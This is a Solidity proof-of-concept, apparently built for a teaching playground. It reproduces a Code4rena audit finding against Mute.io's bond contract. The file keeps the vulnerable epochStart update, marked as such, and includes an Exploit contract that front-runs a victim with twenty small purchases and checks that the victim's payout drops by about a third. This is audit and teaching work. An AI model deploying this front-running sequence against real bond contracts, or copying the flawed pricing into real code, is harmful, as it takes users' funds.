// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mute.Io — attacker can front-run a bond buyer and lower their payout
    (Code4rena 2023-03-mute, finding #16039, H-02)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The audited MuteBond line that advances epochStart after every purchase is
    preserved below (@> VULN).  Repeated small purchases move the start point
    forward; the victim's later purchase therefore executes at a lower price.

    The clock is explicit so the same transaction can model the one-second
    block timestamp increments that occur between the attacker's 20 front-run
    transactions.  No fork, oracle, or cheatcode is needed.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Reduced MuteBond — pricing, deposit and epochStart movement only.
/// Source: contracts/bonds/MuteBond.sol @ 4d8b13a, lines 151–214.
contract MuteBond {
    MockERC20 public immutable lpToken;
    MockERC20 public immutable muteToken;

    uint256 public constant WAD = 1e18;
    uint256 public constant EPOCH_DURATION = 7 days;
    uint256 public startPrice;
    uint256 public maxPrice;
    uint256 public maxPayout;
    uint256 public epochStart;
    uint256 public clock;
    uint256 public totalDebt;
    uint256 public totalPayoutGiven;

    constructor(MockERC20 _lpToken, MockERC20 _muteToken) {
        lpToken = _lpToken;
        muteToken = _muteToken;
        startPrice = 100 ether;
        maxPrice = 200 ether;
        maxPayout = 10_000 ether;
        epochStart = 0;
        clock = 0;
    }

    /// @dev Synthetic-only timestamp control; each real transaction supplies a new block.
    function advance(uint256 seconds_) external {
        clock += seconds_;
    }

    function bondPrice() public view returns (uint256) {
        uint256 timeElapsed = clock - epochStart;
        uint256 priceDelta = maxPrice - startPrice;
        if (timeElapsed > EPOCH_DURATION) timeElapsed = EPOCH_DURATION;
        return (timeElapsed * priceDelta) / EPOCH_DURATION + startPrice;
    }

    function payoutFor(uint256 value) public view returns (uint256) {
        return (bondPrice() * value) / WAD;
    }

    function deposit(uint256 value, address depositor, bool max_buy) external returns (uint256) {
        uint256 payout = payoutFor(value);
        if (max_buy == true) {
            value = maxPurchaseAmount();
            payout = maxDeposit();
        } else {
            require(payout >= WAD / 100, "Bond too small");
            require(payout <= maxPayout, "Bond too large");
            require(payout <= maxDeposit(), "Deposit too large");
        }

        totalDebt += value;
        totalPayoutGiven += payout;
        lpToken.transferFrom(msg.sender, address(this), value);
        muteToken.mint(depositor, payout);

        // Adjust price by a ~5% premium of the current delta.
        uint256 timeElapsed = clock - epochStart;
        epochStart = epochStart + (timeElapsed * 5) / 100; // @> VULN: front-run purchases move epochStart and lower later payouts
        // FIX: take an expected minimum payout/price in deposit and revert if it is not met.

        return payout;
    }

    function maxDeposit() public view returns (uint256) {
        return maxPayout - totalPayoutGiven;
    }

    function maxPurchaseAmount() public view returns (uint256) {
        return (maxDeposit() * WAD) / bondPrice();
    }
}

/// CREATE order: lp (1), mute (2), bond (3).
contract Exploit {
    MockERC20 public lp;
    MockERC20 public mute;
    MuteBond public bond;

    uint256 public constant FRONT_RUN_COUNT = 20;
    uint256 public constant VICTIM_VALUE = 10 ether;
    uint256 public constant MIN_PURCHASE_PAYOUT = 0.01 ether;

    uint256 public expectedPrice;
    uint256 public actualPrice;
    uint256 public expectedPayout;
    uint256 public victimPayout;
    uint256 public payoutLoss;

    constructor() {
        lp = new MockERC20();
        mute = new MockERC20();
        bond = new MuteBond(lp, mute);
    }

    function run() external {
        // Let the price reach maxPrice (the victim's quote at intent time).
        bond.advance(7 days);
        expectedPrice = bond.bondPrice();
        expectedPayout = bond.payoutFor(VICTIM_VALUE);
        require(expectedPrice == 200 ether, "expected max price");

        // Fund/approve the caller contract for the twenty small front-run buys.
        lp.mint(address(this), VICTIM_VALUE + 1 ether);
        lp.approve(address(bond), type(uint256).max);
        uint256 minPurchaseValue = (MIN_PURCHASE_PAYOUT * 1e18) / bond.startPrice() + 1;

        // Each purchase is a separate block in the reported TypeScript PoC.
        // Advancing one second reproduces that block-to-block timestamp drift.
        for (uint256 i = 0; i < FRONT_RUN_COUNT; i++) {
            bond.advance(1);
            bond.deposit(minPurchaseValue, address(this), false);
        }

        // Victim's transaction is included after the front-run sequence.
        bond.advance(1);
        actualPrice = bond.bondPrice();
        uint256 before = mute.balanceOf(address(this));
        bond.deposit(VICTIM_VALUE, address(this), false);
        victimPayout = mute.balanceOf(address(this)) - before;
        payoutLoss = expectedPayout - victimPayout;

        // HARM: the quote deteriorates by roughly one third (the report measured 32%).
        require(actualPrice * 100 <= expectedPrice * 70, "price not front-run lower");
        require(victimPayout < expectedPayout, "payout not reduced");
        require(payoutLoss > 0, "no victim loss");
    }
}
